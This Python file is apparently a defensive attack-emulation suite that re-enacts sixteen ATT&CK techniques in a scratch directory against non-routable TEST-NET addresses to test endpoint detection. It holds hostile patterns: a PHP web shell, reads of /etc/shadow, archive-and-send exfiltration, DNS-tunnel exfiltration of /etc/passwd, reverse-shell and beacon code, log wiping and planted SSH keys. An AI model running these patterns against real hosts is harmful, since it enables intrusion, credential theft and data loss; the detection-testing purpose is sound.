"""Client attack-emulation suite: harmless, randomised re-enactments of common intrusion techniques.

Every scenario performs *real* system calls (fork/exec, file open/read/write, socket connect/send) so an enrolled
endpoint records genuine kernel telemetry, but nothing in it can harm the host:
  * all files are created, modified and deleted inside a private scratch directory (`root`); "sensitive" system files
    are only opened and read (nothing is written outside the scratch directory, nothing is copied off the host);
  * all "external" connections go to the RFC 5737 TEST-NET ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24),
    which are never routed, with short timeouts; there is no listener, so no data is transferred;
  * "ransomware" only XORs decoy files it generated itself; the "miner" spins one core for under two seconds;
    persistence targets are copies inside the scratch directory, never the host's real crontab / authorized_keys.

Randomness (seeded, so a run can be reproduced): process and file names, drop locations, C2 addresses and ports,
number of files, order and presence of optional steps, beacon counts and timing jitter. Each scenario returns its
ground truth — the MITRE ATT&CK techniques and *markers*: strings that occur only in the labels of this run's
attack entities (its scratch path, dropped binaries, C2 address:port). The evaluator matches the endpoint's alert
labels against them.
"""
from __future__ import annotations

import os
import random
import shutil
import socket
import string
import subprocess
import sys
import time

TEST_NETS = ["192.0.2.", "198.51.100.", "203.0.113."]
MASQUERADE = ["kworker", "systemd-updater", "dbus-helper", "snapd-agent", "cron-check", "kthreadd2", "udevadm-sync", "polkit-auth"]
TOOLS = {"sh": "/bin/sh", "cat": "/bin/cat", "ls": "/bin/ls", "id": "/usr/bin/id", "uname": "/bin/uname", "tar": "/bin/tar",
         "find": "/usr/bin/find", "cp": "/bin/cp", "chmod": "/bin/chmod", "ps": "/bin/ps", "whoami": "/usr/bin/whoami",
         "hostname": "/bin/hostname", "gzip": "/bin/gzip", "base64": "/usr/bin/base64", "date": "/bin/date", "env": "/usr/bin/env"}


def _tool(name: str) -> str:
    p = TOOLS.get(name, name)
    return p if os.path.exists(p) else (shutil.which(name) or p)


class Ctx:
    """Per-scenario random context and ground-truth recorder."""

    def __init__(self, root: str, rng: random.Random, fast: bool = False):
        self.root, self.rng, self.fast = root, rng, fast
        self.markers: set[str] = {root}
        self.steps: list[str] = []
        os.makedirs(root, exist_ok=True)

    # ---- randomness ----
    def name(self, n: int = 7) -> str:
        return "".join(self.rng.choice(string.ascii_lowercase + string.digits) for _ in range(n))

    def c2_ip(self) -> str:
        return self.rng.choice(TEST_NETS) + str(self.rng.randint(2, 254))

    def c2(self) -> tuple[str, int]:
        ip = self.c2_ip()
        port = self.rng.choice([443, 8443, 4444, 1337, 8080, 53, 9001, 31337, self.rng.randint(20000, 60000)])
        self.markers.add(f"{ip} {port}")
        return ip, port

    def pause(self, lo: float = 0.05, hi: float = 0.6):
        time.sleep(0 if self.fast else self.rng.uniform(lo, hi))

    def path(self, *parts: str, marker: bool = False) -> str:
        p = os.path.join(self.root, *parts)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        if marker:
            self.markers.add(p)
        return p

    # ---- real syscalls ----
    def run(self, argv: list[str], cwd: str | None = None, timeout: float = 15, stdin: bytes | None = None, marker: bool = False):
        if marker:
            self.markers.add(argv[0])
        self.steps.append(" ".join(argv)[:120])
        try:
            subprocess.run(argv, cwd=cwd or self.root, input=stdin, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=timeout)
        except (OSError, subprocess.SubprocessError):
            pass

    def connect(self, ip: str, port: int, payload: bytes | None = None, udp: bool = False):
        self.steps.append(f"{'udp' if udp else 'tcp'} {ip}:{port}")
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
        s.settimeout(0.2)
        try:
            if udp:
                s.sendto(payload or b"x", (ip, port))
            else:
                s.connect((ip, port))
                if payload:
                    s.sendall(payload)
        except OSError:
            pass
        finally:
            s.close()

    def write(self, path: str, data: bytes, mode: int | None = None):
        with open(path, "wb") as f:
            f.write(data)
        if mode is not None:
            os.chmod(path, mode)

    def read(self, path: str, n: int = 4096) -> bytes:
        try:
            with open(path, "rb") as f:
                return f.read(n)
        except OSError:
            return b""

    def script(self, name: str, body: str, masquerade: bool = False) -> str:
        """A dropped executable shell script (a real exec target)."""
        d = self.path(self.rng.choice([".cache", "tmp", ".local/bin", "var/tmp", ".X11-unix"]), name, marker=True)
        self.write(d, ("#!/bin/sh\n" + body + "\n").encode(), 0o755)
        return d

    def py(self, code: str, argv0: str | None = None, marker: bool = True) -> list[str]:
        """A python child (interpreter-based implants); argv0 masquerades the process name in its cmdline."""
        exe = sys.executable
        if argv0:
            exe_copy = self.path(".local/bin", argv0, marker=marker)
            if not os.path.exists(exe_copy):
                os.symlink(sys.executable, exe_copy)
            exe = exe_copy
        return [exe, "-c", code]


# ======================================================================================== scenarios
# Command vocabularies the scenarios draw from. Exported so the scorer (pdp_server.tools.suite_eval) can recognise
# processes that only the suite runs - the shell children of its recon steps carry no run marker in their labels.
WEB_SHELL_CMDS = ["id", "uname -a", "cat /etc/passwd", "ls -la /", "whoami", "ps aux", "hostname"]
REVERSE_SHELL_CMDS = ["id", "pwd", "ls -la", "uname -r", "cat /etc/os-release", "env", "w"]
DISCOVERY_CMDS = [["whoami"], ["id"], ["uname", "-a"], ["hostname"], ["ps", "-ef"], ["cat", "/proc/net/tcp"],
                  ["cat", "/proc/cpuinfo"], ["ls", "-la", "/home"], ["cat", "/etc/hosts"], ["cat", "/proc/version"]]
BEACON_TASKS = ["id", "hostname", "uname -a", "ls /tmp", "cat /etc/issue", "date"]
PRIVESC_CMDS = ["find /usr/bin /usr/sbin -perm -4000 -type f", "cat /etc/sudoers", "head -1"]
COMMAND_VOCABULARY = sorted(set(WEB_SHELL_CMDS) | set(REVERSE_SHELL_CMDS) | {" ".join(x) for x in DISCOVERY_CMDS}
                            | set(BEACON_TASKS) | set(PRIVESC_CMDS))


# Each: fn(ctx) -> None. Registered with ATT&CK techniques and a tactic.

def web_shell(c: Ctx):
    """T1190 / T1505.003: a web service process writes a web shell, which runs recon commands and calls out."""
    www = c.path("www", "index.html"); c.write(www, b"<html>ok</html>")
    shell = c.path("www", c.rng.choice(["upload", "img", "static"]), f"{c.name(5)}.php", marker=True)
    c.write(shell, b"<?php system($_GET['c']); ?>")
    cmds = c.rng.sample(WEB_SHELL_CMDS, c.rng.randint(3, 6))
    ip, port = c.c2()
    c.run([_tool("sh"), "-c", "; ".join(cmds) + f" > {c.path('www', '.out', marker=True)} 2>&1"])
    c.pause(); c.connect(ip, port, b"POST /r HTTP/1.1\r\n\r\n" + c.read(c.path("www", ".out"), 256))


def drop_and_execute(c: Ctx):
    """T1105 + T1204 + T1059.004: download a payload, mark it executable, run it; it beacons home."""
    ip, port = c.c2()
    c.connect(ip, port, b"GET /stage2 HTTP/1.1\r\n\r\n")
    name = c.rng.choice(MASQUERADE) if c.rng.random() < 0.5 else "." + c.name(6)
    payload = c.script(name, f"cat /etc/hostname >/dev/null; id >/dev/null; exec {sys.executable} -c \"import socket;s=socket.socket();s.settimeout(0.2)\n"
                             f"try: s.connect(('{ip}', {port}))\nexcept OSError: pass\"")
    c.run([_tool("chmod"), "+x", payload]); c.pause()
    c.run([payload], marker=True)


def reverse_shell(c: Ctx):
    """T1059.004 + T1071: an interpreter connects to the C2 and pipes commands into a shell."""
    ip, port = c.c2()
    cmds = "; ".join(c.rng.sample(REVERSE_SHELL_CMDS, 4))
    code = (f"import socket,subprocess;s=socket.socket();s.settimeout(0.2)\ntry: s.connect(('{ip}',{port}))\nexcept OSError: pass\n"
            f"subprocess.run(['/bin/sh','-c','{cmds}'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)")
    c.run(c.py(code, argv0=c.rng.choice(["python3", "bash", c.rng.choice(MASQUERADE)])))


def credential_access(c: Ctx):
    """T1003.008 + T1552.004: read account databases and hunt for private keys, stage the findings."""
    stage = c.path(".cache", c.name(), "loot.txt", marker=True)
    found = b""
    for p in c.rng.sample(["/etc/passwd", "/etc/shadow", "/etc/group", "/etc/sudoers", "/etc/ssh/sshd_config"], c.rng.randint(3, 5)):
        found += c.read(p, 512)
    decoy_home = c.path("home", c.name(5), ".ssh", "id_rsa"); c.write(decoy_home, b"-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA\n")
    c.run([_tool("find"), os.path.join(c.root, "home"), "-name", "id_*"])
    found += c.read(decoy_home)
    c.write(stage, found[:2048])


def discovery(c: Ctx):
    """T1082 / T1033 / T1057 / T1049 / T1016: system, user, process and network discovery with built-in tools."""
    out = c.path(f".{c.name(4)}.log", marker=True)
    cmds = c.rng.sample(DISCOVERY_CMDS, c.rng.randint(5, 8))
    for cmd in cmds:
        c.run([_tool(cmd[0])] + cmd[1:]); c.pause(0.02, 0.2)
    c.write(out, b"\n".join(" ".join(x).encode() for x in cmds))
    ip, port = c.c2(); c.connect(ip, port, c.read(out))


def persistence_cron(c: Ctx):
    """T1053.003: install a cron job (into a scratch copy of the cron directory) that runs a dropped script."""
    payload = c.script(c.rng.choice(MASQUERADE), "sleep 0")
    cron = c.path("etc", "cron.d", c.rng.choice(["0hourly", "sysstat2", c.name(5)]), marker=True)
    c.write(cron, f"*/{c.rng.randint(5, 30)} * * * * root {payload}\n".encode())
    c.read("/etc/crontab")


def persistence_ssh_key(c: Ctx):
    """T1098.004: append an attacker key to authorized_keys (scratch copy of a user's ~/.ssh)."""
    ak = c.path("root", ".ssh", "authorized_keys", marker=True)
    c.write(ak, c.read("/etc/hostname") + f"\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA{c.name(20)} {c.name(6)}@{c.name(5)}\n".encode())
    c.run([_tool("chmod"), "600", ak])


def staged_exfiltration(c: Ctx):
    """T1005 + T1074.001 + T1560.001 + T1041: collect documents, archive, compress and send to the C2."""
    docs = c.path("home", c.name(5), "Documents", "x")
    d = os.path.dirname(docs)
    for i in range(c.rng.randint(5, 20)):
        c.write(os.path.join(d, f"{c.rng.choice(['report', 'invoice', 'contract', 'payroll', 'notes'])}_{i}.{c.rng.choice(['pdf', 'docx', 'xlsx', 'txt'])}"),
                os.urandom(c.rng.randint(200, 4000)))
    arch = c.path("tmp", f".{c.name(5)}.tar", marker=True)
    c.run([_tool("tar"), "cf", arch, d])
    if c.rng.random() < 0.7:
        c.run([_tool("gzip"), "-f", arch]); arch += ".gz"; c.markers.add(arch)
    ip, port = c.c2()
    data = c.read(arch, 1 << 16)
    for k in range(c.rng.randint(2, 6)):
        c.connect(ip, port, data[k * 1024:(k + 1) * 1024]); c.pause(0.02, 0.2)


def exfil_dns_tunnel(c: Ctx):
    """T1048.003 / T1071.004: exfiltrate data in many small UDP datagrams to a resolver-looking address."""
    ip = c.c2_ip()
    c.markers.add(f"{ip} 53")
    secret = c.read("/etc/passwd", 1024)
    code = (f"import socket,base64\nd=base64.b32encode({secret[:300]!r})\nu=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)\n"
            f"for i in range(0,len(d),40):\n    u.sendto(d[i:i+40]+b'.x.example',('{ip}',53))")
    c.run(c.py(code, argv0=c.rng.choice(["dnsd", "resolvconf-helper", c.name(6)])))


def ransomware(c: Ctx):
    """T1486 + T1083: enumerate (decoy) user files, overwrite each with an encrypted copy, drop ransom notes."""
    d = c.path("home", c.name(5), "Pictures", "x"); base = os.path.dirname(d)
    files = []
    for i in range(c.rng.randint(10, 40)):
        p = os.path.join(base, f"img_{i:04d}.{c.rng.choice(['jpg', 'png', 'docx'])}"); c.write(p, os.urandom(512)); files.append(p)
    key = c.rng.randint(1, 255)
    locker = c.script(c.rng.choice(MASQUERADE + ["." + c.name(6)]), "true")
    code = (f"import os\nfor p in {files!r}:\n    b=open(p,'rb').read(); open(p+'.locked','wb').write(bytes(x^{key} for x in b)); os.remove(p)\n"
            f"open({os.path.join(base, 'README_RESTORE.txt')!r},'w').write('your files are encrypted')")
    c.markers.add(os.path.join(base, "README_RESTORE.txt"))
    c.run([locker]); c.run(c.py(code, argv0=os.path.basename(locker) + "-x"))
    ip, port = c.c2(); c.connect(ip, port, b"key=%d" % key)


def lateral_movement(c: Ctx):
    """T1021.004 + T1570: probe SSH/SMB/WinRM on 'internal' hosts and copy a tool for transfer."""
    tool = c.path("tmp", c.rng.choice(MASQUERADE), marker=True)
    c.run([_tool("cp"), _tool("ls"), tool])
    for _ in range(c.rng.randint(3, 8)):
        ip = c.rng.choice(TEST_NETS) + str(c.rng.randint(2, 254)); port = c.rng.choice([22, 445, 5985, 3389, 139])
        c.markers.add(f"{ip} {port}")
        c.connect(ip, port); c.pause(0.01, 0.1)


def masquerade_and_cleanup(c: Ctx):
    """T1036.005 + T1070.004: copy a system binary under a kernel-thread-like name, run it, delete the traces."""
    fake = c.path(c.rng.choice(["var/tmp", ".cache", "dev/shm"]), c.rng.choice(MASQUERADE), marker=True)
    c.run([_tool("cp"), _tool("sh"), fake])
    c.run([fake, "-c", "cat /etc/hostname >/dev/null; uname -a >/dev/null"])
    logf = c.path("var", "log", "auth.log"); c.write(logf, b"session opened\n" * 20)
    c.run([_tool("sh"), "-c", f": > {logf}; rm -f {fake}"])


def privesc_discovery(c: Ctx):
    """T1548.001 + T1068 recon: search for set-uid binaries and writable paths, read sudo configuration."""
    out = c.path(f".{c.name(5)}", "suid.txt", marker=True)
    c.run([_tool("sh"), "-c", f"find /usr/bin /usr/sbin -perm -4000 -type f 2>/dev/null > {out}; cat /etc/sudoers 2>/dev/null | head -1 >/dev/null"])
    c.read("/etc/sudoers")


def cryptominer(c: Ctx):
    """T1496: a masqueraded process burns CPU briefly and talks to a mining pool port."""
    ip = c.rng.choice(TEST_NETS) + str(c.rng.randint(2, 254)); port = c.rng.choice([3333, 4444, 5555, 14444])
    c.markers.add(f"{ip} {port}")
    code = (f"import socket,time\nt=time.time()\nwhile time.time()-t<{0.3 if c.fast else 1.5}: sum(range(10000))\n"
            f"s=socket.socket();s.settimeout(0.2)\ntry: s.connect(('{ip}',{port}))\nexcept OSError: pass")
    c.run(c.py(code, argv0=c.rng.choice(["kswapd0", "kdevtmpfsi", "xmrig", c.rng.choice(MASQUERADE)])))


def ingress_tool_transfer(c: Ctx):
    """T1105 via living-off-the-land: an interpreter fetches a file over HTTP and stores it executable."""
    ip, port = c.c2()
    dst = c.path(c.rng.choice(["tmp", ".cache"]), "." + c.name(6), marker=True)
    code = (f"import urllib.request,os\ntry: urllib.request.urlopen('http://{ip}:{port}/t', timeout=0.2)\nexcept Exception: pass\n"
            f"open({dst!r},'wb').write(b'\\x7fELF'+os.urandom(64)); os.chmod({dst!r},0o755)")
    c.run(c.py(code, argv0=None, marker=False))


def interpreter_beacon(c: Ctx):
    """T1059.006 + T1071.001 + T1029: a scripted implant beacons with jitter and runs tasked commands."""
    ip, port = c.c2()
    n = c.rng.randint(3, 8)
    tasks = c.rng.sample(BEACON_TASKS, 3)
    code = (f"import socket,subprocess,time,random\nfor i in range({n}):\n    s=socket.socket();s.settimeout(0.2)\n"
            f"    try: s.connect(('{ip}',{port}))\n    except OSError: pass\n    s.close()\n"
            f"    if i in (1,{n - 1}): subprocess.run(['/bin/sh','-c',{'; '.join(tasks)!r}],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)\n"
            f"    time.sleep(random.uniform(0,{0.05 if c.fast else 0.4}))")
    c.run(c.py(code, argv0=c.rng.choice(MASQUERADE)))


SCENARIOS = {
    "web_shell": (web_shell, "initial-access/persistence", ["T1190", "T1505.003", "T1059.004"]),
    "drop_and_execute": (drop_and_execute, "execution", ["T1105", "T1204.002", "T1059.004"]),
    "reverse_shell": (reverse_shell, "execution/c2", ["T1059.004", "T1071"]),
    "credential_access": (credential_access, "credential-access", ["T1003.008", "T1552.004"]),
    "discovery": (discovery, "discovery", ["T1082", "T1033", "T1057", "T1049"]),
    "persistence_cron": (persistence_cron, "persistence", ["T1053.003"]),
    "persistence_ssh_key": (persistence_ssh_key, "persistence", ["T1098.004"]),
    "staged_exfiltration": (staged_exfiltration, "collection/exfiltration", ["T1005", "T1074.001", "T1560.001", "T1041"]),
    "exfil_dns_tunnel": (exfil_dns_tunnel, "exfiltration", ["T1048.003", "T1071.004"]),
    "ransomware": (ransomware, "impact", ["T1486", "T1083"]),
    "lateral_movement": (lateral_movement, "lateral-movement", ["T1021.004", "T1570"]),
    "masquerade_and_cleanup": (masquerade_and_cleanup, "defense-evasion", ["T1036.005", "T1070.004"]),
    "privesc_discovery": (privesc_discovery, "privilege-escalation", ["T1548.001"]),
    "cryptominer": (cryptominer, "impact", ["T1496"]),
    "ingress_tool_transfer": (ingress_tool_transfer, "command-and-control", ["T1105"]),
    "interpreter_beacon": (interpreter_beacon, "command-and-control", ["T1059.006", "T1071.001", "T1029"]),
}


def run_scenario(name: str, root: str, seed: int, fast: bool = False) -> dict:
    """Run one scenario in `root`; returns its ground-truth record."""
    fn, tactic, techniques = SCENARIOS[name]
    c = Ctx(root, random.Random(seed), fast=fast)
    t0 = time.time_ns()
    fn(c)
    t1 = time.time_ns()
    return {"scenario": name, "tactic": tactic, "techniques": techniques, "seed": seed, "root": root,
            "start_ns": t0, "end_ns": t1, "markers": sorted(c.markers), "steps": c.steps}
